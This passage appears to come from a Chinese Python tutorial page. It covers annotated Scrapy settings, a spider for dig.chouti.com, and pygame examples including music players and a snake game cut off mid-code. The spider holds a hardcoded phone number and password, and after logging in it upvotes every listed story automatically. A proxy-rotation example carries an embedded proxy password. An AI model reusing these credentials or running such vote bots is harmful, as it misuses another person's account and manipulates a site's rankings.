BOT_NAME = 'step8_king'

# 2. 爬虫应用路径
SPIDER_MODULES = ['step8_king.spiders']
NEWSPIDER_MODULE = 'step8_king.spiders'

# Crawl responsibly by identifying yourself (and your website) on the user-agent
# 3. 客户端 user-agent请求头
# USER_AGENT = 'step8_king (+http://www.yourdomain.com)'

# Obey robots.txt rules
# 4. 禁止爬虫配置
# ROBOTSTXT_OBEY = False

# Configure maximum concurrent requests performed by Scrapy (default: 16)
# 5. 并发请求数
# CONCURRENT_REQUESTS = 4

# Configure a delay for requests for the same website (default: 0)
# See http://scrapy.readthedocs.org/en/latest/topics/settings.html#download-delay
# See also autothrottle settings and docs
# 6. 延迟下载秒数
# DOWNLOAD_DELAY = 2


# The download delay setting will honor only one of:
# 7. 单域名访问并发数,并且延迟下次秒数也应用在每个域名
# CONCURRENT_REQUESTS_PER_DOMAIN = 2
# 单IP访问并发数,如果有值则忽略:CONCURRENT_REQUESTS_PER_DOMAIN,并且延迟下次秒数也应用在每个IP
# CONCURRENT_REQUESTS_PER_IP = 3

# Disable cookies (enabled by default)
# 8. 是否支持cookie,cookiejar进行操作cookie
# COOKIES_ENABLED = True
# COOKIES_DEBUG = True

# Disable Telnet Console (enabled by default)
# 9. Telnet用于查看当前爬虫的信息,操作爬虫等...
#    使用telnet ip port ,然后通过命令操作
# TELNETCONSOLE_ENABLED = True
# TELNETCONSOLE_HOST = '127.0.0.1'
# TELNETCONSOLE_PORT = [6023,]


# 10. 默认请求头
# Override the default request headers:
# DEFAULT_REQUEST_HEADERS = {
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
#     'Accept-Language': 'en',
# }


# Configure item pipelines
# See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html
# 11. 定义pipeline处理请求
# ITEM_PIPELINES = {
#    'step8_king.pipelines.JsonPipeline': 700,
#    'step8_king.pipelines.FilePipeline': 500,
# }



# 12. 自定义扩展,基于信号进行调用
# Enable or disable extensions
# See http://scrapy.readthedocs.org/en/latest/topics/extensions.html
# EXTENSIONS = {
#     # 'step8_king.extensions.MyExtension': 500,
# }


# 13. 爬虫允许的最大深度,可以通过meta查看当前深度;0表示无深度
# DEPTH_LIMIT = 3

# 14. 爬取时,0表示深度优先Lifo(默认);1表示广度优先FiFo

# 后进先出,深度优先
# DEPTH_PRIORITY = 0
# SCHEDULER_DISK_QUEUE = 'scrapy.squeue.PickleLifoDiskQueue'
# SCHEDULER_MEMORY_QUEUE = 'scrapy.squeue.LifoMemoryQueue'
# 先进先出,广度优先

# DEPTH_PRIORITY = 1
# SCHEDULER_DISK_QUEUE = 'scrapy.squeue.PickleFifoDiskQueue'
# SCHEDULER_MEMORY_QUEUE = 'scrapy.squeue.FifoMemoryQueue'

# 15. 调度器队列
# SCHEDULER = 'scrapy.core.scheduler.Scheduler'
# from scrapy.core.scheduler import Scheduler


# 16. 访问URL去重
# DUPEFILTER_CLASS = 'step8_king.duplication.RepeatUrl'


# Enable and configure the AutoThrottle extension (disabled by default)
# See http://doc.scrapy.org/en/latest/topics/autothrottle.html

"""
17. 自动限速算法
    from scrapy.contrib.throttle import AutoThrottle
    自动限速设置
    1. 获取最小延迟 DOWNLOAD_DELAY
    2. 获取最大延迟 AUTOTHROTTLE_MAX_DELAY
    3. 设置初始下载延迟 AUTOTHROTTLE_START_DELAY
    4. 当请求下载完成后,获取其"连接"时间 latency,即:请求连接到接受到响应头之间的时间
    5. 用于计算的... AUTOTHROTTLE_TARGET_CONCURRENCY
    target_delay = latency / self.target_concurrency
    new_delay = (slot.delay + target_delay) / 2.0 # 表示上一次的延迟时间
    new_delay = max(target_delay, new_delay)
    new_delay = min(max(self.mindelay, new_delay), self.maxdelay)
    slot.delay = new_delay
"""

# 开始自动限速
# AUTOTHROTTLE_ENABLED = True
# The initial download delay
# 初始下载延迟
# AUTOTHROTTLE_START_DELAY = 5
# The maximum download delay to be set in case of high latencies
# 最大下载延迟
# AUTOTHROTTLE_MAX_DELAY = 10
# The average number of requests Scrapy should be sending in parallel to each remote server
# 平均每秒并发数
# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0

# Enable showing throttling stats for every response received:
# 是否显示
# AUTOTHROTTLE_DEBUG = True

# Enable and configure HTTP caching (disabled by default)
# See http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings


"""
18. 启用缓存
    目的用于将已经发送的请求或相应缓存下来,以便以后使用

    from scrapy.downloadermiddlewares.httpcache import HttpCacheMiddleware
    from scrapy.extensions.httpcache import DummyPolicy
    from scrapy.extensions.httpcache import FilesystemCacheStorage
"""
# 是否启用缓存策略
# HTTPCACHE_ENABLED = True

# 缓存策略:所有请求均缓存,下次在请求直接访问原来的缓存即可
# HTTPCACHE_POLICY = "scrapy.extensions.httpcache.DummyPolicy"
# 缓存策略:根据Http响应头:Cache-Control、Last-Modified 等进行缓存的策略
# HTTPCACHE_POLICY = "scrapy.extensions.httpcache.RFC2616Policy"

# 缓存超时时间
# HTTPCACHE_EXPIRATION_SECS = 0

# 缓存保存路径
# HTTPCACHE_DIR = 'httpcache'

# 缓存忽略的Http状态码
# HTTPCACHE_IGNORE_HTTP_CODES = []

# 缓存存储的插件
# HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'


"""
19. 代理,需要在环境变量中设置
    from scrapy.contrib.downloadermiddleware.httpproxy import HttpProxyMiddleware

    方式一:使用默认
        os.environ
        {
            http_proxy:http://root:woshiniba@192.168.11.11:9999/
            https_proxy:http://192.168.11.11:9999/
        }
    方式二:使用自定义下载中间件

    def to_bytes(text, encoding=None, errors='strict'):
        if isinstance(text, bytes):
            return text
        if not isinstance(text, six.string_types):
            raise TypeError('to_bytes must receive a unicode, str or bytes '
                            'object, got %s' % type(text).__name__)
        if encoding is None:
            encoding = 'utf-8'
        return text.encode(encoding, errors)

    class ProxyMiddleware(object):
        def process_request(self, request, spider):
            PROXIES = [
                {'ip_port': '111.11.228.75:80', 'user_pass': ''},
                {'ip_port': '120.198.243.22:80', 'user_pass': ''},
                {'ip_port': '111.8.60.9:8123', 'user_pass': ''},
                {'ip_port': '101.71.27.120:80', 'user_pass': ''},
                {'ip_port': '122.96.59.104:80', 'user_pass': ''},
                {'ip_port': '122.224.249.122:8088', 'user_pass': ''},
            ]
            proxy = random.choice(PROXIES)
            if proxy['user_pass'] is not None:
                request.meta['proxy'] = to_bytes("http://%s" % proxy['ip_port'])
                encoded_user_pass = base64.encodestring(to_bytes(proxy['user_pass']))
                request.headers['Proxy-Authorization'] = to_bytes('Basic ' + encoded_user_pass)
                print "**************ProxyMiddleware have pass************" + proxy['ip_port']
            else:
                print "**************ProxyMiddleware no pass************" + proxy['ip_port']
                request.meta['proxy'] = to_bytes("http://%s" % proxy['ip_port'])

    DOWNLOADER_MIDDLEWARES = {
       'step8_king.middlewares.ProxyMiddleware': 500,
    }

"""

"""
20. Https访问
    Https访问时有两种情况:
    1. 要爬取网站使用的可信任证书(默认支持)
        DOWNLOADER_HTTPCLIENTFACTORY = "scrapy.core.downloader.webclient.ScrapyHTTPClientFactory"
        DOWNLOADER_CLIENTCONTEXTFACTORY = "scrapy.core.downloader.contextfactory.ScrapyClientContextFactory"

    2. 要爬取网站使用的自定义证书
        DOWNLOADER_HTTPCLIENTFACTORY = "scrapy.core.downloader.webclient.ScrapyHTTPClientFactory"
        DOWNLOADER_CLIENTCONTEXTFACTORY = "step8_king.https.MySSLFactory"

        # https.py
        from scrapy.core.downloader.contextfactory import ScrapyClientContextFactory
        from twisted.internet.ssl import (optionsForClientTLS, CertificateOptions, PrivateCertificate)

        class MySSLFactory(ScrapyClientContextFactory):
            def getCertificateOptions(self):
                from OpenSSL import crypto
                v1 = crypto.load_privatekey(crypto.FILETYPE_PEM, open('/Users/wupeiqi/client.key.unsecure', mode='r').read())
                v2 = crypto.load_certificate(crypto.FILETYPE_PEM, open('/Users/wupeiqi/client.pem', mode='r').read())
                return CertificateOptions(
                    privateKey=v1,  # pKey对象
                    certificate=v2,  # X509对象
                    verify=False,
                    method=getattr(self, 'method', getattr(self, '_ssl_method', None))
                )
    其他:
        相关类
            scrapy.core.downloader.handlers.http.HttpDownloadHandler
            scrapy.core.downloader.webclient.ScrapyHTTPClientFactory
            scrapy.core.downloader.contextfactory.ScrapyClientContextFactory
        相关配置
            DOWNLOADER_HTTPCLIENTFACTORY
            DOWNLOADER_CLIENTCONTEXTFACTORY

"""



"""
21. 爬虫中间件
    class SpiderMiddleware(object):

        def process_spider_input(self,response, spider):
            '''
            下载完成,执行,然后交给parse处理
            :param response:
            :param spider:
            :return:
            '''
            pass

        def process_spider_output(self,response, result, spider):
            '''
            spider处理完成,返回时调用
            :param response:
            :param result:
            :param spider:
            :return: 必须返回包含 Request 或 Item对象的可迭代对象(iterable)
            '''
            return result

        def process_spider_exception(self,response, exception, spider):
            '''
            异常调用
            :param response:
            :param exception:
            :param spider:
            :return: None,继续交给后续中间件处理异常;含 Response 或 Item 的可迭代对象(iterable),交给调度器或pipeline
            '''
            return None


        def process_start_requests(self,start_requests, spider):
            '''
            爬虫启动时调用
            :param start_requests:
            :param spider:
            :return: 包含 Request对象的可迭代对象
            '''
            return start_requests

    内置爬虫中间件:
        'scrapy.contrib.spidermiddleware.httperror.HttpErrorMiddleware': 50,
        'scrapy.contrib.spidermiddleware.offsite.OffsiteMiddleware': 500,
        'scrapy.contrib.spidermiddleware.referer.RefererMiddleware': 700,
        'scrapy.contrib.spidermiddleware.urllength.UrlLengthMiddleware': 800,
        'scrapy.contrib.spidermiddleware.depth.DepthMiddleware': 900,

"""
# from scrapy.contrib.spidermiddleware.referer import RefererMiddleware
# Enable or disable spider middlewares
# See http://scrapy.readthedocs.org/en/latest/topics/spider-middleware.html
SPIDER_MIDDLEWARES = {
   # 'step8_king.middlewares.SpiderMiddleware': 543,
}


"""
22. 下载中间件
    class DownMiddleware1(object):
        def process_request(self, request, spider):
            '''
            请求需要被下载时,经过所有下载器中间件的process_request调用
            :param request:
            :param spider:
            :return:
                None,继续后续中间件去下载;
                Response对象,停止process_request的执行,开始执行process_response
                Request对象,停止中间件的执行,将Request重新调度器
                raise IgnoreRequest异常,停止process_request的执行,开始执行process_exception
            '''
            pass



        def process_response(self, request, response, spider):
            '''
            spider处理完成,返回时调用
            :param response:
            :param result:
            :param spider:
            :return:
                Response对象:转交给其他中间件process_response
                Request对象:停止中间件,request会被重新调度下载
                raise IgnoreRequest 异常:调用Request.errback
            '''
            print('response1')
            return response

        def process_exception(self, request, exception, spider):
            '''
            当下载处理器(download handler)或 process_request() (下载中间件)抛出异常
            :param response:
            :param exception:
            :param spider:
            :return:
                None:继续交给后续中间件处理异常;
                Response对象:停止后续process_exception方法
                Request对象:停止中间件,request将会被重新调用下载
            '''
            return None


    默认下载中间件
    {
        'scrapy.contrib.downloadermiddleware.robotstxt.RobotsTxtMiddleware': 100,
        'scrapy.contrib.downloadermiddleware.httpauth.HttpAuthMiddleware': 300,
        'scrapy.contrib.downloadermiddleware.downloadtimeout.DownloadTimeoutMiddleware': 350,
        'scrapy.contrib.downloadermiddleware.useragent.UserAgentMiddleware': 400,
        'scrapy.contrib.downloadermiddleware.retry.RetryMiddleware': 500,
        'scrapy.contrib.downloadermiddleware.defaultheaders.DefaultHeadersMiddleware': 550,
        'scrapy.contrib.downloadermiddleware.redirect.MetaRefreshMiddleware': 580,
        'scrapy.contrib.downloadermiddleware.httpcompression.HttpCompressionMiddleware': 590,
        'scrapy.contrib.downloadermiddleware.redirect.RedirectMiddleware': 600,
        'scrapy.contrib.downloadermiddleware.cookies.CookiesMiddleware': 700,
        'scrapy.contrib.downloadermiddleware.httpproxy.HttpProxyMiddleware': 750,
        'scrapy.contrib.downloadermiddleware.chunked.ChunkedTransferMiddleware': 830,
        'scrapy.contrib.downloadermiddleware.stats.DownloaderStats': 850,
        'scrapy.contrib.downloadermiddleware.httpcache.HttpCacheMiddleware': 900,
    }

"""
# from scrapy.contrib.downloadermiddleware.httpauth import HttpAuthMiddleware
# Enable or disable downloader middlewares
# See http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html
# DOWNLOADER_MIDDLEWARES = {
#    'step8_king.middlewares.DownMiddleware1': 100,
#    'step8_king.middlewares.DownMiddleware2': 500,
# }

settings

</textarea>chouti自动登入点赞<textarea>
import scrapy
from scrapy.selector import HtmlXPathSelector
from scrapy.http.request import Request
from scrapy.http.cookies import CookieJar
from scrapy import FormRequest


class ChouTiSpider(scrapy.Spider):
    # 爬虫应用的名称,通过此名称启动爬虫命令
    name = "chouti"
    # 允许的域名
    allowed_domains = ["chouti.com"]

    cookie_dict = {}
    has_request_set = {}
    # 重写起始函数
    def start_requests(self):
        url = 'http://dig.chouti.com/'
        # return [Request(url=url, callback=self.login)]
        yield Request(url=url, callback=self.login)

    def login(self, response):
        cookie_jar = CookieJar()
        cookie_jar.extract_cookies(response, response.request)
        for k, v in cookie_jar._cookies.items():
            for i, j in v.items():
                for m, n in j.items():
                    self.cookie_dict[m] = n.value
        print(self.cookie_dict)
        req = Request(
            url='http://dig.chouti.com/login',
            method='POST',
            headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
            body='phone=8615057101356&password=199SulkyBuckets&Month=1',
            cookies=self.cookie_dict,
            callback=self.check_login
        )
        yield req

    def check_login(self, response):
        # print(response.text)
        req = Request(
            url='http://dig.chouti.com/',
            method='GET',
            callback=self.show,
            cookies=self.cookie_dict,
            dont_filter=True
        )
        yield req

    def show(self, response):
        # print(response.text)
        hxs = HtmlXPathSelector(response)
        news_list = hxs.select('//div[@id="content-list"]/div[@class="item"]')
        for new in news_list:
            # temp = new.xpath('div/div[@class="part2"]/@share-linkid').extract()
            link_id = new.xpath('*/div[@class="part2"]/@share-linkid').extract_first()
            yield Request(
                url='http://dig.chouti.com/link/vote?linksId=%s' %(link_id,),
                method='POST',
                cookies=self.cookie_dict,
                callback=self.do_favor
            )

        # page_list = hxs.select('//div[@id="dig_lcpage"]//a[re:test(@href, "/all/hot/recent/\d+")]/@href').extract()
        # for page in page_list:
        #
        #     page_url = 'http://dig.chouti.com%s' % page
        #     import hashlib
        #     hash = hashlib.md5()
        #     hash.update(bytes(page_url,encoding='utf-8'))
        #     key = hash.hexdigest()
        #     if key in self.has_request_set:
        #         pass
        #     else:
        #         self.has_request_set[key] = page_url
        #         yield Request(
        #             url=page_url,
        #             method='GET',
        #             callback=self.show
        #         )

    def do_favor(self, response):
        print(response.text)

</textarea>
</div>

<div id="pygame">
<h3>pygame</h3><pre>
pip install pygame

>>>import pygame
>>>print(pygame.ver)
1.9.3

PyGame是一个用Python写的SDL库。SDL是一个能访问计算机多媒体硬件组件(包括声卡,视频卡,输入组件等)的跨平台库。SDL是一个非常强大的工具,擅长创建基于多媒体硬件的程序,但它是用C语言写的,可C语言很难,所以我们选择PyGam

Pygame常用模块
pygame.cdrom  访问光驱
pygame.cursors  加载光标
pygame.display  访问显示设备
pygame.draw 绘制形状、线和点
pygame.event  管理事件
pygame.font 使用字体
pygame.image  加载和存储图片
pygame.joystick 使用游戏手柄或者类似的东西
pygame.key  读取键盘按键
pygame.mixer  声音
pygame.mouse  鼠标
pygame.movie  播放视频
pygame.music  播放音频
pygame.overlay  访问高级视频叠加
pygame.rect 管理矩形区域
pygame.scrap  本地剪贴板访问
pygame.sndarray 操作声音数据
pygame.sprite 操作移动图像
pygame.surface  管理图像和屏幕
pygame.surfarray  管理点阵图像数据
pygame.time 管理时间和帧信息
pygame.transform  缩放和移动图像

display模块的常用方法
pygame.display.init() 初始化display模块
pygame.display.quit() 结束display模块
pygame.display.get_init() 如果display模块已经被初始化,则返回True
pygame.display.set_mode() 初始化一个准备显示的界面
pygame.display.get_surface()  获取当前的Surface对象
pygame.display.flip() 更新整个待显示的Surface对象到屏幕上
pygame.display.update() 更新部分内容显示到屏幕上,如果没有参数,则与flip功能相同(上一条)

</pre><textarea>
import pygame
import sys

pygame.init()                           # 初始化pygame
size = width, height = 320, 240         # 设置窗口大小
screen = pygame.display.set_mode(size)  # 显示窗口

while True:                             # 死循环确保窗口一直显示
    for event in pygame.event.get():    # 遍历所有事件
        if event.type == pygame.QUIT:   # 如果单击关闭窗口则退出
            sys.exit()

pygame.quit()                           # 退出pygame

</textarea><textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = 'image/sushiplate.jpg'
mouse_image = 'image/fugu.png'

pygame.init()                                        # 初始化pygame,为使用硬件做准备
screen = pygame.display.set_mode((640, 480), 0, 32)  # 创建了一个窗口
pygame.display.set_caption("hello world")            # 设置窗口标题

# 加载并转换图像
background = pygame.image.load(background_image).convert()
mouse_cursor = pygame.image.load(mouse_image).convert_alpha()

while True:
    for event in pygame.event.get():
        if event.type == QUIT:       # 接收到退出事件后退出程序
            exit()

    screen.blit(background, (0, 0))   # 画上背景图,blit第一个参数为一个Surface对象,第二个为左上角位置
    x, y = pygame.mouse.get_pos()     # 获得鼠标位置
    x -= mouse_cursor.get_width()/2   # 计算光标左上角位置
    y -= mouse_cursor.get_height()/2
    screen.blit(mouse_cursor, (x, y)) # 画上光标
    pygame.display.update()           # 刷新画面,画完以后得用update更新,否则画面一片漆黑

</textarea><pre>
set_mode
返回一个Surface对象,代表了桌面上出现的窗口。第一个参数代表分辨率控制窗口大小;第二个参数是标志位代表扩展选项,如果不需要使用任何特性则指定为0;第三个为色深不推荐设置。

标志位的功能,这几个量相当于是全局的常量,使用的时候可以from pygame.locals import *导入
pygame.FULLSCREEN  创建一个全屏窗口 (create a fullscreen display)
pygame.DOUBLEBUF 创建一个"双缓冲"窗口,建议在HWSURFACE或者OPENGL时使用( recommended for HWSURFACE or OPENGL)
pygame.HWSURFACE 创建一个硬件加速的窗口,必须和FULLSCREEN同时使用( hardware accelerated, only in FULLSCREEN)
pygame.OPENGL  创建一个OPENGL渲染的窗口 (create an OpenGL-renderable display)
pygame.RESIZABLE 创建一个可以改变大小的窗口 (display window should be sizeable)
pygame.NOFRAME 创建一个没有边框的窗口 (display window will have no border or controls)

screen = pygame.display.set_mode((640, 480), FULLSCREEN, 32) # 全屏显示

convert: 将图像转化为Surface对象,每次加载完图像后就要使用这个函数.
convert_alpha:相比convert,保留了Alpha通道信息(可以简单理解为透明的部分),这样光标才可以是不规则的形状

</pre>
</div>

<div id="pygame_media">
<h4>media</h4><pre>
pygame.mixer.music
pygame module for controlling streamed audio

pygame.mixer.music.load: Load a music file for playback
pygame.mixer.music.unload: Unload the currently loaded music to free up resources
pygame.mixer.music.play: Start the playback of the music stream
pygame.mixer.music.rewind: restart music
pygame.mixer.music.stop: stop the music playback
pygame.mixer.music.pause: temporarily stop music playback
pygame.mixer.music.unpause: resume paused music
pygame.mixer.music.fadeout: stop music playback after fading out
pygame.mixer.music.set_volume: set the music volume
pygame.mixer.music.get_volume: get the music volume
pygame.mixer.music.get_busy: check if the music stream is playing
pygame.mixer.music.set_pos: set position to play from
pygame.mixer.music.get_pos: get the music play time
pygame.mixer.music.queue: queue a sound file to follow the current
pygame.mixer.music.set_endevent: have the music send an event when playback stops
pygame.mixer.music.get_endevent: get the event a channel sends when playback stops

</pre>Python音乐播放器<textarea>
from pygame import mixer
from pynput import keyboard
from pynput.keyboard import Key

value = 0.5  #音量初始值(范围是 0~1 )

#混音器初始化、加载音乐、播放音乐
mixer.init()
mixer.music.load("xxx.mp3")
mixer.music.play()

#设置初始音量
mixer.music.set_volume(value)

def on_press(key):
    global value

    if key == Key.left:
        #暂停
        mixer.music.pause()
    elif key == Key.right:
        #恢复暂停
        mixer.music.unpause()
    elif key == Key.up:
        if value < 1:
            value += 0.1
        mixer.music.set_volume(value)
    elif key == Key.down:
        if value > 0:
            value -= 0.1
        mixer.music.set_volume(value)

#开始监听键盘的动作
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

while True:
    pass

</textarea>Pyhon音乐播放器<textarea>
import time
import pygame
muxi_k = """
_________________
|Pyhon音乐播放器|
͞͞͞͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞ ͞
"""
print(muxi_k)
file=r'E:\wamp64\www\study\python\media\burning  maria arredondo.mp3'  # mp3文件路径
pygame.mixer.init()
print("正在播放",file)
track = pygame.mixer.music.load(file)
pygame.mixer.music.play()
# pygame.mixer.music.play(loops=0, start=0.0)
time.sleep(130)                   #播放时间
pygame.mixer.music.stop()

</textarea>本地音乐播放器<textarea>
import os
import pygame

def welcome():
    print('''
    *************************
     * 欢迎来到酷我音乐播放器*
    *************************
        ''')

def select():
    print('''
    *******************************************************************
      1.播放  2.停止  3.下一曲  4.上一曲  5.增大音量  6.减少音量  0.退出
    *******************************************************************
            ''')
    return input("请选择您要操作的选项：")

def getMusicList(path):
    fileList = os.listdir(path)
    musicList = []
    for filename in fileList:
        musicList.append(os.path.join(path,filename))
    return musicList

def playMusic(path):
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()

def nextMusic(musicList,index):
    index +=1
    playMusic(musicList[index%len(musicList)])
    return index

if __name__ =='__main__':
    welcome()
    path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'media')
    musicList = getMusicList(path)
    index =0

    while True:
        num = select()
        if num =="1":
            print("播放")
            playMusic(musicList[index])
        elif num =="2":
            print("暂停")
        elif num =="3":
            print("下一首")
            index = nextMusic(musicList,index)
        elif num =="4":
            print("上一首")
        elif num =="5":
            print("增大音量")
        elif num =="6":
            print("减少音量")
        elif num =="0":
            print("退出")
            break
        else:
            print("选择有误,请重新选择...")

</textarea>
</div>

<div id="pygame_event">
<h4>事件</h4><pre>
Pygame会接受用户的各种操作(比如按键盘,移动鼠标等)产生事件。事件随时可能发生,而且量也可能会很大,Pygame的做法是把一系列的事件存放一个队列里,逐个的处理

pygame.event.get()处理所有的事件,也可以使用pygame.event.wait(),pygame会等到发生一个时间才继续下去;另外一个方法pygame.event.poll()一旦调用,它会根据现在的情形返回一个真实的事件,或者一个"什么都没有"

事件的产生途径和参数
QUIT  用户按下关闭按钮  none
ATIVEEVENT  Pygame被激活或者隐藏 gain,state
KEYDOWN 键盘被按下 unicode,key,mod
KEYUP 键盘被放开 key,mod
MOUSEMOTION 鼠标移动  pos,rel,buttons
MOUSEBUTTONDOWN 鼠标按下  pos,button
MOUSEBUTTONUP 鼠标放开  pos,button
JOYAXISMOTION 游戏手柄(Joystick or pad)移动 joy,axis,value
JOYBALLMOTION 游戏球(Joy ball)?移动  joy,axis,value
JOYHATMOTION  游戏手柄(Joystick)?移动 joy,axis,value
JOYBUTTONDOWN 游戏手柄按下  joy,button
JOYBUTTONUP 游戏手柄放开  joy,button
VIDEORESIZE Pygame窗口缩放  size,w,h
VIDEOEXPOSE Pygame窗口部分公开(expose)? none
USEREVENT 触发了一个用户事件 code

游戏主循环
游戏主循环(事件)是一直在运行着的。无论是在玩游戏,更新游戏状态,渲染画面或者是采集输入数据,它是一直在不间断运行着的。当创建一个循环时必须能保证有方法可以跳出循环结束程序运行。所有玩游戏的操作都会进过PyGame的事件队列中,可以用pygame.event.get()方法来操作它。这个方法会返回一个列表,该列表包含队列中所有事件的列表。可以对它做个循环遍历,根据事件类型做出相应的操作,如KEYDOWN(按键)和QUIT(退出)事件。

from pygame.locals import *
if event.type == KEYDOWN:
if event.key == K_ESCAPE:
if event.type == QUIT:

</pre>把所有发生的事件输出<textarea>
import pygame
from pygame.locals import *
from sys import exit

pygame.init()
SCREEN_SIZE = (640, 480)
screen = pygame.display.set_mode(SCREEN_SIZE, 0, 32)

font = pygame.font.SysFont("MicrosoftYaHei", 16)
font_height = font.get_linesize()
event_text = []

while True:
    event = pygame.event.wait()
    event_text.append(str(event))

    event_text = event_text[-SCREEN_SIZE[1]//font_height:]  # 保证event_text里面只保留一个屏幕的文字

    if event.type == QUIT:
        exit()

    screen.fill((255, 255, 255))

    y = SCREEN_SIZE[1] - font_height  # 寻找一个合适的起笔位置,最下面开始,留一行的空
    for text in reversed(event_text):
        screen.blit(font.render(text, True, (0, 0, 0)), (0, y))
        y -= font_height
    pygame.display.update()

</textarea><pre>
【 处理鼠标事件 】
MOUSEMOTION事件会在鼠标动作的时候发生,它有三个参数：
buttons – 一个含有三个数字的元组,三个值分别代表左键、中键和右键,1就是按下了。
pos – 位置
rel – 代表了现在距离上次产生鼠标事件时的距离

还有MOUSEBUTTONDOWN和MOUSEBUTTONUP两个事件。它们的参数为：
button – 这个值代表了哪个按键被操作
pos – 位置

【 处理键盘事件 】
键盘的事件为KEYDOWN和KEYUP

KEYDOWN和KEYUP的参数描述如下
key – 按下或者放开的键值,是一个数字,Pygame中可以使用K_xxx来表示,比如字母a就是K_a,还有K_SPACE和K_RETURN等。
mod – 包含了组合键信息,如果mod & KMOD_CTRL是真的话,表示用户同时按下了Ctrl键。类似的还有KMOD_SHIFT,KMOD_ALT。
unicode – 代表了按下键的Unicode值

</pre>使用方向键来移动图片<textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = '../image/sushiplate.jpg'
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()

x, y = 0, 0
move_x, move_y = 0, 0
while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            exit()
        elif event.type == KEYDOWN:
            if event.key == K_LEFT:
                move_x = -1
            elif event.key == K_RIGHT:
                move_x = 1
            elif event.key == K_UP:
                move_y = -1
            elif event.key == K_DOWN:
                move_y = 1
        elif event.type == KEYUP:
            move_x = 0
            move_y = 0

    x += move_x
    y += move_y

    screen.fill((0, 0, 0))
    screen.blit(background, (x,y))

    pygame.display.update()

</textarea>贪吃蛇<textarea>
import pygame
import random
from sys import exit

caption_width = caption_height = 500 # 画布宽高
white_color = (255,255,255)
red_color = (255,0,0)
black_color = (0,0,0)
snake_init_pos = [[250,250], [240,250], [230,250], [220,250]]
head_pos = [250,250]
food_pos = [random.randrange(1,50)*10, random.randrange(1,50)*10]
cell = 10 # 格子的宽高

pygame.init()
pygame.display.set_caption('snake')
captipn = pygame.display.set_mode((caption_width, caption_height))

def draw_rect(color, position):
    pygame.draw.rect(captipn, color, pygame.Rect(position[0], position[1], cell, cell))

# 只要头碰到了食物就算吃到了给蛇的身体加一格,只要发现头的位置和食物的位置相同就说明吃到了,此时列表的数据就不 pop 了并且食物的位置重新随机生成
def change_direction(head_pos):
    global food_pos
    snake_init_pos.insert(0, list(head_pos))
    if head_pos != food_pos:
        snake_init_pos.pop()
    else:
        food_pos = [random.randrange(1,50)*10, random.randrange(1,50)*10]

# 怎么判断撞到自己了呢?其实就是把列表的数据拿出来比对,第一个元素是蛇头拿它跟其它元素比对,相同就代表撞到了
def hit_the_self():
    return snake_init_pos[0] in snake_init_pos[1:]

# 如何判断撞到了墙了呢?通过蛇头的位置只要不超过 [500, 500] 就没事,也就是说只要蛇头都在画布之内就行
def hit_the_wall():
    return head_pos[0] >= caption_width or head_pos[0] < 0 or head_pos[1] >= caption_width or head_pos[1] < 0

def main():
    # 通过pygame的rect方法可以在画布上画矩形,那么一开始蛇应该是处于中间的,蛇的长度就给4个格子,一个格子的宽高设置为10
    for pos in snake_init_pos:
        draw_rect(white_color, pos)

    draw_rect(red_color, food_pos)  # 画一个食物

    pygame.display.update()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT: exit()

            '''
            按键持续按下响应
            查看哪些按键是已进按下的,后通过循环实现对应操作
            key_pressed = pygame.key.get_pressed()
            if key_pressed[pygame.K_a] or key_pressed[pygame.K_LEFT]:
                print('pressing')

            '''

            if event.type == pygame.KEYDOWN:
                # 每次触发一个方向键就让蛇头的位置发生相应的变化然后更新蛇身的位置
                # 更新蛇身位置主要将是将列表中的元素更新一下,添加蛇头的位置pop掉蛇尾的位置,每次更新需要渲染一下画布
                if event.key == pygame.K_LEFT:
                    print('left')
                    head_pos[0] -= cell
                elif event.key == pygame.K_RIGHT:
                    print('right')
                    head_pos[0] += cell
                elif event.key == pygame.K_UP:
                    print('up')
                    head_pos[1] -= cell
                elif event.key == pygame.K_DOWN:
                    print('down')
                    head_pos[1] += cell

                if hit_the_self() or hit_the_wall():
                    return pygame.quit()

                change_direction(head_pos)
                print(snake_init_pos)

                captipn.fill(black_color)
                for pos in snake_init_pos:
                    draw_rect(white_color, pos)

                draw_rect(red_color, food_pos)
                pygame.display.update()

# 画布一直频繁的更新所以可以使用 pygame 的 clock
# clock = pygame.time.Clock()
# clock.tick(10)
# 这样子每秒不会超过 10 帧这样就不会那么浪费资源了

if __name__ == '__main__':
    main()

</textarea><textarea>
## 导入相关模块
import random
import pygame
import sys

from pygame.locals import *

snake_speed = 5      #贪吃蛇的速度
windows_width = 800
windows_height = 600 #游戏窗口的大小
cell_size = 20       #贪吃蛇身体方块大小,身体大小必须能被窗口长宽整除

# 蛇是有大小尺寸的, 因此地图的实际尺寸是相对于贪吃蛇的大小尺寸而言的
map_width = int(windows_width / cell_size)
map_height = int(windows_height / cell_size)

# 颜色定义
white = (255, 255, 255)
black = (0, 0, 0)
gray = (230, 230, 230)
dark_gray = (40, 40, 40)
DARKGreen = (0, 155, 0)
Green = (0, 255, 0)
Red = (255, 0, 0)
blue = (0, 0, 255)
dark_blue =(0,0, 139)

BG_COLOR = black #游戏背景颜色

# 定义方向
UP = 1
DOWN = 2
LEFT = 3
RIGHT = 4

#主函数
def main():
    pygame.init() # 模块初始化
    snake_speed_clock = pygame.time.Clock() # 创建Pygame时钟对象
    screen = pygame.display.set_mode((windows_width, windows_height)) #
    screen.fill(white)
    pygame.display.set_caption("Python 贪吃蛇小游戏") #设置标题
    show_start_info(screen)                          #欢迎信息
    while True:
        running_game(screen, snake_speed_clock)
        show_gameover_info(screen)

#游戏运行主体
